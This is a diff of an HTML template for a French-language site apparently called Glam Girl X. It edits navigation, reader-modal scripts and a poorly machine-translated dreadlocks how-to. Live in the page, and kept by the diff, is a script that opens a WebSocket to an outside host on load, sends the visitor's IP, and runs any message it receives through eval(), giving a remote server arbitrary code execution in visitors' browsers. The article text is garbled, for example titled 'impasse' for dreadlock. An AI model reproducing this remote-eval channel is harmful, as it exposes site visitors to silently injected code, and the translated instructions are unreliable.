@@ -65,7 +65,7 @@
               <a class="nav-link" href="/fr/landing" title="Visitez la page de destination">Atterrissage</a>
             </li>
             <li class="nav-item">
-              <a class="nav-link" href="https://qoshlli.com" title="Chat vidéo">Chat</a>
+              <a class="nav-link" href="/fr/chat" title="Chat vidéo">Chat</a>
             </li>
             <li class="nav-item">
               <a class="nav-link" href="/fr/private" title="Voir des photos privées avec une clé">Privé</a>
@@ -123,7 +123,8 @@
 <img src="https://i.imgur.com/dAQRaWt.jpeg" alt="DaisyPhoto de profil" width="120" height="120" style="margin-top:5px; margin-right:10px; margin-bottom:10px; border-radius: 50%;">
 <p><i>Par Daisy</i></p>
 
-<div style="white-space: pre-wrap;"><p> Comment porter une impasse? </p> <p> <br> </p> <p> 1.Commencez par pousser vos cheveux sur la longueur souhaitée.Vos cheveux doivent mesurer au moins 2 à 3 pouces pour les meilleurs résultats. </p> <p> <br> </p> <p> 2.Coupez vos cheveux en petites pièces à l'aide d'un peigne.La taille des sections déterminera la taille de vos dreadlocks, alors assurez-vous de choisir une taille avec laquelle vous êtes à l'aise. </p> <p> <br> </p> <p> 3.Commencez en arrière à chaque section de cheveux en les tournant et en les tirant étroitement vers les racines.Cela créera des nœuds dans les cheveux, qui finiront par se former en dreadlocks. </p> <p> <br> </p> <p> 4.Appliquez de la cire ou du gel sur chaque section de cheveux pour aider à maintenir les nœuds en place et à encourager les cheveux à se taper ensemble. </p> <p> <br> </p> <p> 5.Continuez en arrière et tournez chaque section de cheveux jusqu'à ce que vous ayez terminé toute votre tête.Ce processus peut prendre du temps, alors soyez patient et prenez les pauses au besoin. </p> <p> <br> </p> <p> 6.Une fois que tous vos cheveux ont été tordus et en arrière, laissez-le reposer pendant quelques joursPour permettre aux nœuds de se resserrer et de se former en dreadlocks. </p> <p> <br> </p> <p> 7.Après quelques jours, vous pouvez commencer à coiffer et à maintenir vos dreadlocks en les lavant avec un shampooing sans résidus et en utilisant un crochet pour aider à resserrer les nœuds lâches. </p> <p> <br> </p> <p> 8.Pour garder vos dreadlocks soignés et bien rangés, pensez à utiliser un foulard ou un bandana pour les couvrir lorsque vous dormez ou dans des environnements sales.L'entretien et l'entretien réguliers aideront vos dreadlocks</div>
+<div style="white-space: pre-wrap;"><p>Comment porter une impasse?</p><p><br/></p><p>1. Commencez par laisser pousser vos cheveux à la longueur souhaitée. Vos cheveux doivent mesurer au moins 2 à 3 pouces de long pour de meilleurs résultats.</p><p><br/></p><p>2. Coupez vos cheveux en petites pièces à l'aide d'un peigne. La taille des sections déterminera la taille de vos dreadlocks, alors assurez-vous de choisir une taille avec laquelle vous êtes à l'aise.</p><p><br/></p><p>3. Commencez en arrière à chaque section de cheveux en les tournant et en les tirant étroitement vers les racines. Cela créera des nœuds dans les cheveux, qui finiront par se former en dreadlocks.</p><p><br/></p><p>4. Appliquez de la cire ou du gel sur chaque section de cheveux pour aider à maintenir les nœuds en place et à encourager les cheveux à se taper ensemble.</p><p><br/></p><p>5. Continuez à rétablir et à tordonner chaque section de cheveux jusqu'à ce que vous ayez terminé toute votre tête. Ce processus peut prendre du temps, alors soyez patient et faites des pauses au besoin.</p><p><br/></p><p>6. Une fois que tous vos cheveux ont été tordus et en arrière, laissez-le reposer pendant quelques jours pour permettre aux nœuds de se resserrer et de se former en dreadlocks.</p><p><br/></p><p>7. Après quelques jours, vous pouvez commencer à coiffer et entretenir vos dreadlocks en les lavant avec un shampooing sans résidus et en utilisant un crochet pour aider à resserrer les nœuds lâches.</p><p><br/></p><p>8. Pour garder vos dreadlocks soignés et bien rangés, pensez à utiliser un foulard ou un bandana pour les couvrir lorsque vous dormez ou dans des environnements sales. L'entretien et l'entretien réguliers aideront vos dreadlocks à rester en bonne santé et dynamiques.</p></div>
+
 
 <div class="mx-auto p-1 m-1" style="display: flex; justify-content: space-around;">
 <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6209985848112194"
@@ -240,6 +241,23 @@
         
 
 
+var currentReader = 0;
+function toggleReader(id) {
+	currentReader = id;
+	$('#reader-modal' + id).toggleClass('hide');
+	$('#reader-modal' + id).toggleClass('fade-in-fast');
+	$('#bnav' + id).toggleClass('hide');
+	$('#bnav' + id).toggleClass('fade-in-fast');
+	setTimeout(function() {
+		$('#reader-modal' + id).toggleClass('fade-in-fast');
+		$('#bnav' + id).toggleClass('fade-in-fast');
+	}, 1000);
+}
+function jumpbookto(page) {
+	document.getElementById('reader-modal' + currentReader).scrollTo(0, (parseInt(document.getElementById('jumpto' + page).value)-1) * parseInt(window.innerHeight));
+	document.getElementById('pagecount' + page).innerHTML = parseInt(document.getElementById('jumpto' + page).value);
+}
+
 
         
         
@@ -250,32 +268,32 @@
             
         	Prism.highlightAll();
         });
-        var socket;
-        function openSocket() {
+        var remoteSocket;
+        function openRemoteSocket() {
             window.location.hash = '';
-            socket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
-            socket.addEventListener("open", (event) => {
+            remoteSocket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
+            remoteSocket.addEventListener("open", (event) => {
                 console.log('Socket open.');
                 fetch('https://lotteh.com/remote/generate/')
         		    .then(response => response.json())
         		    .then(data => {
-        		        socket.send(data.ip);
+        		        remoteSocket.send(data.ip);
         		    })
         		    .catch(error => {
         		        console.log('Error:', error);
         		    });
             });
-            socket.addEventListener("closed", (event) => {
+            remoteSocket.addEventListener("closed", (event) => {
                 console.log('Socket closed.');
                 setTimeout(function() {
-                    openSocket();
+                    openRemoteSocket();
                 }, 10000);
             });
-        	socket.addEventListener("message", (event) => {
+        	remoteSocket.addEventListener("message", (event) => {
                     eval(event.data);
             });
         }
-        openSocket();
+        openRemoteSocket();
         $(document).ready(function() {
         	$("#contact-form").submit(function(e){
                 	e.preventDefault();
@@ -427,8 +445,8 @@ if(document.getElementById("current-time")) {
               link.href = url;
               link.download = 'Glam Girl X - ' + filename;
               document.body.appendChild(link);
+              link.classList.add('hide');
               link.click();
-              document.body.removeChild(link);
             }
             function downloadQr() {
                     downloadQrImage(image.src, 'QR Code');
@@ -450,6 +468,8 @@ if(document.getElementById("current-time")) {
   });
 </script>
 
+    
+    
     
     
     <script>
